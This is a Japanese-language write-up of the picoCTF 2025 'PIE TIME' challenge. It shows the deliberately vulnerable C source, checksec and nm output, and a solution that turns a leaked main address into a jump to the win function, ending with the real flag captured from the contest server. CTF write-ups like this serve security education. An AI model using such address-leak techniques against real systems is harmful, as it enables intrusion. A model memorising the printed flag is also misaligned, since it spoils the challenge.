#### PIE TIME（75 points）

1つの C言語のソースコード（vuln.c）と、1つのバイナリプログラム（vuln）をダウンロードできます。また、サーバを起動して進める問題のようです。

<figure class="figure-image figure-image-fotolife" title="PIE TIME（75 points）">[f:id:daisuke20240310:20250315185626p:plain:alt=PIE TIME（75 points）]<figcaption>PIE TIME（75 points）</figcaption></figure>

まず、ソースコードです。

セグメンテーションフォールトが発生した場合のハンドラが定義されています。main関数では、シグナルが有効化された後、main関数のアドレスが表示され、ユーザから入力されたアドレスにジャンプするコードになっています。

普通に考えると、main関数のアドレスから、プログラムバイナリのベースアドレスを求めて、win関数のアドレスにジャンプすればいいような気がします。

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

表層解析を行います。問題のタイトルの通り、PIE が有効なようです。

```sh
$ file vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped

$ ~/bin/checksec --file=vuln
RELRO       STACK CANARY  NX          PIE          RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Full RELRO  Canary found  NX enabled  PIE enabled  No RPATH  No RUNPATH  78 Symbols  No       0          1            vuln

$ checksec --file=vuln
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

PIE とはいえ、プログラムバイナリの中のオフセットは変わりません。main関数と win関数のオフセットを取得しておきます。

```sh
$ nm vuln | grep main
                 U __libc_start_main@@GLIBC_2.2.5
000000000000133d T main

$ nm vuln | grep win
00000000000012a7 T win
```

`0x133D - 0x12A7 = 0x96` なので、main関数のアドレスが表示されたら、0x96 を引いたアドレスを指定すれば良さそうです。やってみます。出来ました。

```sh
$ ./vuln
Address of main: 0x5556d974633d
Enter the address to jump to, ex => 0x12345: 0x5556D97462A7         
Your input: 5556d97462a7
You won!
picoCTF{deadbeef}
```

次は、サーバの方でやってみます。出来ました。

```sh
$ nc rescued-float.picoctf.net 52146
Address of main: 0x6514713c233d
Enter the address to jump to, ex => 0x12345: 0x6514713C22A7
Your input: 6514713c22a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_00dea386}
```

